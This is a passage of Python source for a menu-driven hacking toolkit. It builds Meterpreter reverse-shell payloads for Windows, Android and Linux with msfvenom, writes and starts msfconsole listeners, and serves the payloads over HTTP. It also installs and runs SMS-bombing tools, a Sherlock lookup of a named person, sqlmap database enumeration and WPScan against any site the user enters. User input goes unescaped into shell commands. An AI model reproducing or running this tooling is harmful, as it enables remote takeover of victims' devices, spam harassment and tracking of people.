                                    os.system("echo 'set LPORT "+portmsf+"' >> windows.rb")
                                    os.system("echo 'set PAYLOAD windows/meterpreter/reverse_tcp' >> windows.rb")
                                    os.system("echo 'exploit' >> windows.rb")
                                    os.system("gnome-terminal -- msfconsole -r windows.rb &")

                                    http = input("Do you want to create a http server with python3? [y/n] ")

                                    if http == 'y' or http == 'Y':
                                        httpPort = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Metasploit-httpPort"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                                        os.system("gnome-terminal -- python3 -m http.server "+httpPort+" ")

                            if payload == 'android':
                                print("")
                                loading("Creating a Android Payload",load)
                                print("")
                                os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ipmsf+" LPORT="+portmsf+" AndroidMeterpreterDebug=true AndroidWakelock=true  -o  "+filename+".apk 2>/dev/null")
                                print("")
                                print(Fore.RED+"Payload Saved ==> "+filename+".apk")

                                listen = input("Do you want to start the listener? [y/n] ")
                                if listen == 'y' or listen == 'Y':
                                    os.system("rm android.rb 2>/dev/null")
                                    os.system("echo 'use exploit/multi/handler' >> android.rb")
                                    os.system("echo 'set LHOST "+ipmsf+"' >> android.rb")
                                    os.system("echo 'set LPORT "+portmsf+"' >> android.rb")
                                    os.system("echo 'set PAYLOAD android/meterpreter/reverse_tcp' >> android.rb")
                                    os.system("echo 'run' >> android.rb")
                                    os.system("gnome-terminal -- msfconsole -r android.rb &")

                                    http = input("Do you want to create a http server with python3? [y/n] ")
                                    if http == 'y' or http == 'Y':
                                        httpPort = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Metasploit-httpPort"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                                        os.system("gnome-terminal -- python3 -m http.server "+httpPort+" ")

                            if payload == 'linux':
                                print("")
                                loading("Creating a Linux Payload",load)
                                print("")
                                os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+ipmsf+" LPORT="+portmsf+" -f elf >> "+filename+".elf 2>/dev/null")
                                print(Fore.RED+"Payload Saved ==> "+filename+".apk")

                                listen = input("Do you want to start the listener? [y/n] ")

                                if listen == 'y' or listen == 'Y':
                                    os.system("rm linux.rb 2>/dev/null")
                                    os.system("echo 'use exploit/multi/handler' >> linux.rb")
                                    os.system("echo 'set LHOST "+ipmsf+"' >> linux.rb")
                                    os.system("echo 'set LPORT "+portmsf+"' >> linux.rb")
                                    os.system("echo 'set PAYLOAD linux/x86/meterpreter/reverse_tcp' >> linux.rb")
                                    os.system("echo 'run' >> linux.rb")
                                    os.system("gnome-terminal -- msfconsole -r linux.rb &")

                                    http = input("Do you want to create a http server with python3? [y/n] ")
                                    if http == 'y' or http == 'Y':
                                        httpPort = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Metasploit-httpPort"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")
                                        os.system("gnome-terminal -- python3 -m http.server "+httpPort+" ")

                        elif metasploit == '02' or metasploit == '2':
                            boot()

        elif options == '10':
            os.system('cls' if os.name == 'nt' else 'clear')
            logo()
            print(f'''
                                            \u001b[38;5;111m╔═╗╔═╗╔═╗╔╦╗  ╔═╗╔╦╗╔═╗
                                            \u001b[38;5;159m╚═╗╠═╝╠═╣║║║  ╚═╗║║║╚═╗
                                            \u001b[38;5;195m╚═╝╩  ╩ ╩╩ ╩  ╚═╝╩ ╩╚═╝ Tools\u001b[38;5;26m
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m TBomb                   \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m SETSMS                  \u001b[38;5;111m║ 
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                        \u001b[38;5;111m╚═════════════════════════════╝''')

            while (True):
                spamsms = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"SpamSMS"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                if spamsms == '01' or spamsms == '1':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    logo()
                    print(f'''
                                            \u001b[38;5;111m╔═╗╔═╗╔═╗╔╦╗  ╔═╗╔╦╗╔═╗
                                            \u001b[38;5;159m╚═╗╠═╝╠═╣║║║  ╚═╗║║║╚═╗
                                            \u001b[38;5;195m╚═╝╩  ╩ ╩╩ ╩  ╚═╝╩ ╩╚═╝ TBomb\u001b[38;5;26m
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Install                 \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Execute                 \u001b[38;5;111m║ 
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                        \u001b[38;5;111m╚═════════════════════════════╝''')

                    while (True):
                        tbomb = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"SpamSMS-TBomb"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                        if tbomb == '01' or tbomb == '1':
                           os.system("pip install tbomb")

                        elif tbomb == '2' or tbomb == '02':
                            os.system("tbomb")
                        elif tbomb == '3' or tbomb == '03':
                            boot()

                elif spamsms == '02' or spamsms == '2':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    logo()
                    print(f'''
                                            \u001b[38;5;111m╔═╗╔═╗╔═╗╔╦╗  ╔═╗╔╦╗╔═╗
                                            \u001b[38;5;159m╚═╗╠═╝╠═╣║║║  ╚═╗║║║╚═╗
                                            \u001b[38;5;195m╚═╝╩  ╩ ╩╩ ╩  ╚═╝╩ ╩╚═╝ SETSMS\u001b[38;5;26m
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Install                 \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Execute                 \u001b[38;5;111m║ 
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                        \u001b[38;5;111m╚═════════════════════════════╝''')

                    while (True):
                        setsms = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"SpamSMS-SETSMS"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                        if setsms == '1' or setsms == '01':
                            os.chdir("lib")
                            os.chdir("spamsms")
                            os.system("git clone https://github.com/Darkmux/SETSMS/")
                            os.chdir("..")
                            os.chdir("..")

                        elif setsms == '2' or setsms == '02':
                            os.system("chmod 777 $HOME/MTBLLS/lib/spamsms/SETSMS/SETSMS.sh")
                            os.system("bash $HOME/MTBLLS/lib/spamsms/SETSMS/SETSMS.sh")

        elif options == '11':
            os.system('cls' if os.name == 'nt' else 'clear')
            logo()
            print(f'''
                                            \u001b[38;5;111m╔═╗╦ ╦╔═╗╦═╗╦  ╔═╗╔═╗╦╔═
                                            \u001b[38;5;159m╚═╗╠═╣║╣ ╠╦╝║  ║ ║║  ╠╩╗
                                            \u001b[38;5;195m╚═╝╩ ╩╚═╝╩╚═╩═╝╚═╝╚═╝╩ ╩\u001b[38;5;26m
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Install                 \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Execute                 \u001b[38;5;111m║ 
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                        \u001b[38;5;111m╚═════════════════════════════╝''')

            while(True):
                sherlock = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Sherlock"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                if sherlock == '01' or sherlock == '1':
                    os.chdir("lib")
                    os.chdir("sherlock")
                    os.system("git clone https://github.com/sherlock-project/sherlock")
                    os.chdir("..")
                    os.chdir("..")

                elif sherlock == '02' or sherlock == '2':
                    sherlockname = input("name of the person you want to find> ")

                    sherlockcommand = "python3 $HOME/MTBLLS/lib/sherlock/sherlock/sherlock/sherlock.py "+sherlockname
                    try:
                        os.system(sherlockcommand)
                    except:
                        print("ERROR!")

                elif sherlock == '3' or sherlock == '03':
                    boot()

        elif options == '12':
            os.system('cls' if os.name == 'nt' else 'clear')
            logo()
            print(f'''
                                            \u001b[38;5;111m╔═╗╦ ╦╔╗ ╦  ╦╔═╗╔╦╗╔═╗╦═╗
                                            \u001b[38;5;159m╚═╗║ ║╠╩╗║  ║╚═╗ ║ ║╣ ╠╦╝
                                            \u001b[38;5;195m╚═╝╚═╝╚═╝╩═╝╩╚═╝ ╩ ╚═╝╩╚═ Subdomains Founder\u001b[38;5;26m
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Install                 \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Execute                 \u001b[38;5;111m║ 
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                        \u001b[38;5;111m╚═════════════════════════════╝''')

            while(True):
                sublister = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Sublist3r"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                if sublister == '1' or sublister == '01':
                    os.chdir("lib")
                    os.chdir("sublist3r")
                    os.system("git clone https://github.com/aboul3la/Sublist3r")
                    os.chdir("..")
                    os.chdir("..")

                elif sublister == '2' or sublister == '02':
                    website = input(Fore.RED+"website> ")
                    websitecommand = "python3 $HOME/MTBLLS/lib/sublist3r/Sublist3r/sublist3r.py -d "+website

                    try:
                        os.system(websitecommand)
                    except:
                        print("ERROR!")

                elif sublister == '3' or sublister == '03':
                    boot()

        elif options == '13':
            os.system('cls' if os.name == 'nt' else 'clear')
            logo()
            print(f'''
                                              \u001b[38;5;111m╔═╗╔═╗ ╦  ╔╦╗╔═╗╔═╗
                                              \u001b[38;5;159m╚═╗║═╬╗║  ║║║╠═╣╠═╝
                                              \u001b[38;5;195m╚═╝╚═╝╚╩═╝╩ ╩╩ ╩╩  \u001b[38;5;26m
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Get DBS List            \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                        \u001b[38;5;111m╚═════════════════════════════╝''')
            while(True):
                sqlmap = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"Sqlmap"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                if sqlmap == '1' or sqlmap == '01':
                    print("type 'exit' to exit or input de website")
                    dbslist = input("website> ")
                    dbscommand = 'sqlmap -u "'+dbslist+'" --dbs'

                    if dbslist == 'exit':
                        boot()

                    try:
                        os.system(dbscommand)
                    except:
                        print(Fore.RED+"ERROR!!!")
                elif sqlmap == '2' or sqlmap == '02':
                    boot()

        elif options == '14':
            os.system('cls' if os.name == 'nt' else 'clear')
            logo()
            print(f'''
                                    \u001b[38;5;111m╔═╗╦╔╗╔╔═╗╔═╗╔═╗╔═╗╦  ╔═╗╦╔═╦╦  ╦  ╔═╗╦═╗
                                    \u001b[38;5;159m╠═╝║║║║║╣ ╠═╣╠═╝╠═╝║  ║╣ ╠╩╗║║  ║  ║╣ ╠╦╝
                                    \u001b[38;5;195m╩  ╩╝╚╝╚═╝╩ ╩╩  ╩  ╩═╝╚═╝╩ ╩╩╩═╝╩═╝╚═╝╩╚═ by x04000\u001b[38;5;26m
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Install                 \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Execute                 \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m3\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                        \u001b[38;5;111m╚═════════════════════════════╝''')

            while(True):
                pine = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"PineappleKiller"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                if pine == '1' or pine == '01':
                    os.chdir("lib")
                    os.chdir("pine")
                    os.system("git clone https://github.com/x04000/PineappleKiller")
                    os.chdir("..")
                    os.chdir("..")

                elif pine == '2' or pine == '02':
                    os.system("python3 $HOME/MTBLLS/lib/pine/PineappleKiller/PineappleKiller.py")

                elif pine == '3' or pine == '03':
                    boot()

        elif options == '15':
            os.system('cls' if os.name == 'nt' else 'clear')
            logo()
            print(f'''
                                              \u001b[38;5;111m╦ ╦╔═╗╔═╗╔═╗╔═╗╔╗╔
                                              \u001b[38;5;159m║║║╠═╝╚═╗║  ╠═╣║║║
                                              \u001b[38;5;195m╚╩╝╩  ╚═╝╚═╝╩ ╩╝╚╝ WordPress Security Scanner\u001b[38;5;26m
                                        \u001b[38;5;111m╔═════════════════════════════╗
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m1\u001b[38;5;111m]\033[0;35m Scan Website            \u001b[38;5;111m║
                                        \u001b[38;5;111m║ \u001b[38;5;111m[\033[0;35m2\u001b[38;5;111m]\033[0;35m Exit                    \u001b[38;5;111m║ 
                                        \u001b[38;5;111m╚═════════════════════════════╝''')
            while(True):
                wps = input(Fore.BLUE+"["+Fore.RED+"root"+Fore.GREEN+"@"+Fore.MAGENTA+"mtblls"+Fore.WHITE+"("+Fore.YELLOW+"WPScan"+Fore.WHITE+")"+Fore.MAGENTA+" ~"+Fore.BLUE+"]# ")

                if wps == '1' or wps == '01':
                    print("Type 'exit' to exit or type a website to scan")

                    website = input("website>")
                    wpscommand = 'wpscan --url '+website
                    try:
                        os.system(wpscommand)
                    except:
                        print(Fore.RED+"ERROR!!!")

                elif wps == '2' or wps == '02':
                    boot()

        elif options == 'clear':
            os.system('cls' if os.name == 'nt' else 'clear')

        elif options == 'exit':
            input("Press [ENTER] to exit")
            sys.exit(69)

        elif options == 'menu':
            boot()


def boot():
    os.system('cls' if os.name == 'nt' else 'clear')
    logo()
    options()
    choice()

login()
